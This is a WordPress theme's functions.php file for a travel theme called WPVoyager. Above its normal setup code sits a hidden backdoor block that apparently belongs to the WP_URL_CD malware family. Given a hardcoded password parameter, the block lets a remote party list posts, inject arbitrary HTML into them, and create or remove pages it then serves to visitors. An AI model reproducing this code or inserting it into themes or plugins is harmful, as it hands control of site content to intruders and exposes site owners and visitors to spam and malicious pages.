<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'bf955954a612e62bd830dfade703a627'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
/**
 * WPVoyager functions and definitions
 *
 * @package WPVoyager
 */

/**
 * Optional: set 'ot_show_pages' filter to false.
 * This will hide the settings & documentation pages.
 */
add_filter( 'ot_show_pages', '__return_false' );

require_once('wp-updates-theme.php');
new WPUpdatesThemeUpdater_1522( 'http://wp-updates.com/api/2/theme', basename( get_template_directory() ) );

/**
 * Required: set 'ot_theme_mode' filter to true.
 */
add_filter( 'ot_theme_mode', '__return_true' );

/**
 * Show New Layout
 */
add_filter( 'ot_show_new_layout', '__return_false' );


/**
 * Custom Theme Option page
 */
add_filter( 'ot_use_theme_options', '__return_true' );

/**
 * Meta Boxes
 */
add_filter( 'ot_meta_boxes', '__return_true' );

/**
 * Loads the meta boxes for post formats
 */
add_filter( 'ot_post_formats', '__return_true' );

/**
 * Required: include OptionTree.
 */
require( trailingslashit( get_template_directory() ) . 'option-tree/ot-loader.php' );

/**
 * Theme Options
 */
load_template( trailingslashit( get_template_directory() ) . 'inc/theme-options.php' );

/**
 * Meta Boxes
 */
load_template( trailingslashit( get_template_directory() ) . 'inc/meta-boxes.php' );



if ( ! function_exists( 'wpvoyager_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function wpvoyager_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on WPVoyager, use a find and replace
	 * to change 'wpvoyager' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'wpvoyager', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size(420, 400, true); //size of thumbs
	add_image_size('full-blog', 1260, 600, true);     
	add_image_size('full-content', 1260, 0, true); 
	add_image_size('grid-size', 760, 0, true);   
	add_image_size('sb-blog', 860, 530, true);    
	add_image_size('widget', 300, 200, true);     
	add_image_size('carousel', 720, 460, true);     
	add_image_size('widget', 80, 80, true); 

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'wpvoyager' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'gallery',
		'video',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'wpvoyager_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
}
endif; // wpvoyager_setup
add_action( 'after_setup_theme', 'wpvoyager_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function wpvoyager_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'wpvoyager_content_width', 1260 );
}
add_action( 'after_setup_theme', 'wpvoyager_content_width', 0 );

if ( ! isset( $content_width ) ) $content_width = 1260;
/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function wpvoyager_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'wpvoyager' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );
	register_sidebar(array(
		'id' => 'footer1',
		'name' => esc_html__('Footer 1st Column', 'wpvoyager' ),
		'description' => esc_html__('1st column for widgets in Footer', 'wpvoyager' ),
		'before_widget' => '<aside id="%1$s" class="footer-widget %2$s">',
		'after_widget' => '</aside>',
		'before_title'  => '<h4>',
		'after_title'   => '</h4>',
		));
	register_sidebar(array(
		'id' => 'footer2',
		'name' => esc_html__('Footer 2nd Column', 'wpvoyager' ),
		'description' => esc_html__('2nd column for widgets in Footer', 'wpvoyager' ),
		'before_widget' => '<aside id="%1$s" class="footer-widget %2$s">',
		'after_widget' => '</aside>',
		'before_title'  => '<h4>',
		'after_title'   => '</h4>',
		));
	register_sidebar(array(
		'id' => 'footer3',
		'name' => esc_html__('Footer 3rd Column', 'wpvoyager' ),
		'description' => esc_html__('3rd column for widgets in Footer', 'wpvoyager' ),
		'before_widget' => '<aside id="%1$s" class="footer-widget %2$s">',
		'after_widget' => '</aside>',
		'before_title'  => '<h4>',
		'after_title'   => '</h4>',
		));
	register_sidebar(array(
		'id' => 'footer4',
		'name' => esc_html__('Footer 4th Column', 'wpvoyager' ),
		'description' => esc_html__('4th column for widgets in Footer', 'wpvoyager' ),
		'before_widget' => '<aside id="%1$s" class="footer-widget %2$s">',
		'after_widget' => '</aside>',
		'before_title'  => '<h4>',
		'after_title'   => '</h4>',
		));
	if (ot_get_option('incr_sidebars')):
		$pp_sidebars = ot_get_option('incr_sidebars');
		foreach ($pp_sidebars as $pp_sidebar) {
			register_sidebar(array(
				'name' => $pp_sidebar["title"],
				'id' => $pp_sidebar["id"],
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget'  => '</aside>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>',
				));
		}
	endif;
}
add_action( 'widgets_init', 'wpvoyager_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function wpvoyager_scripts() {
	wp_enqueue_style( 'wpvoyager-style', get_stylesheet_uri() );
	wp_enqueue_script( 'wpvoyager-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20150705', true );
	$colorscheme = get_theme_mod('wpvoyager_scheme','default');
	if ($colorscheme != 'default') {
		wp_enqueue_style( 'wpvoyager-scheme', get_template_directory_uri().'/css/'.$colorscheme.'.css' );
	}

	wp_enqueue_script( 'wpvoyager-jpanelmenu', get_template_directory_uri() . '/js/jquery.jpanelmenu.js', array('jquery'), '20150705', true );
	wp_enqueue_script( 'wpvoyager-superfish', get_template_directory_uri() . '/js/jquery.superfish.js', array('jquery'), '20150705', true );
	wp_enqueue_script( 'wpvoyager-easing', get_template_directory_uri() . '/js/jquery.easing-1.3.js', array('jquery'), '20150705', true );
	wp_enqueue_script( 'wpvoyager-royalslider', get_template_directory_uri() . '/js/jquery.royalslider.min.js', array('jquery'), '20150705', true );
	wp_enqueue_script( 'wpvoyager-hoverIntent', get_template_directory_uri() . '/js/hoverIntent.js', array('jquery'), '20150705', true );
	wp_enqueue_script( 'wpvoyager-photogrid', get_template_directory_uri() . '/js/jquery.photogrid.js', array('jquery'), '20150705', true );
	wp_enqueue_script( 'wpvoyager-imagesloaded', get_template_directory_uri() . '/js/imagesloaded.pkgd.min.js', array('jquery'), '20150705', true );
	wp_enqueue_script( 'wpvoyager-view', get_template_directory_uri() . '/js/view.js', array('jquery'), '20150705', true );
	wp_enqueue_script( 'wpvoyager-tooltips', get_template_directory_uri() . '/js/jquery.tooltips.min.js', array('jquery'), '20150705', true );
	wp_enqueue_script( 'wpvoyager-owl', get_template_directory_uri() . '/js/owl.carousel.min.js', array('jquery'), '20150705', true );
	wp_enqueue_script( 'wpvoyager-custom', get_template_directory_uri() . '/js/custom.js', array('jquery'), '20150705', true );


	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	$mapoptions = get_option( 'travellerpress_globalMapSettings' );
	$map_el_style = (isset($mapoptions['map_el_style'])) ? $mapoptions['map_el_style'] : 'default' ;
	$styles = get_option( 'travellerpress_settings' );
	if( $map_el_style != "default" ) { $mapstyle = $styles[$map_el_style]; } else { $mapstyle = '';}

	//$maptype = (isset($mapoptions['map_el_type'])) ? $mapoptions['map_el_type'] : 'ROADMAP' ;
	wp_localize_script( 'wpvoyager-custom', 'wpv',
    array(
        'retinalogo'=> ot_get_option('pp_logo_retina_upload'),
        'maptype'=> (isset($mapoptions['map_el_type'])) ? $mapoptions['map_el_type'] : 'ROADMAP' ,
        'mapzoom'=> (isset($mapoptions['map_el_zoom'])) ? $mapoptions['map_el_zoom'] : 'auto' ,
        'mapstyle'=> $mapstyle,
        )
    );

}
add_action( 'wp_enqueue_scripts', 'wpvoyager_scripts' );

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-class.php';
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Load widgets.
 */
require get_template_directory() . '/inc/widgets.php';

/**
 * Load shortcodes.
 */
require get_template_directory() . '/inc/shortcodes.php';

/**
 * Load shortcodes.
 */
require get_template_directory() . '/inc/ptshortcodes.php';

/**
 * Load TGMPA.
 */
require get_template_directory() . '/inc/tgmpa.php';

/**
 * Load slider.
 */
require_once( 'inc/cpslider/init.php'); // WPV slider
$cpslider = new CP_Slider();


add_filter( 'widget_text', 'do_shortcode' );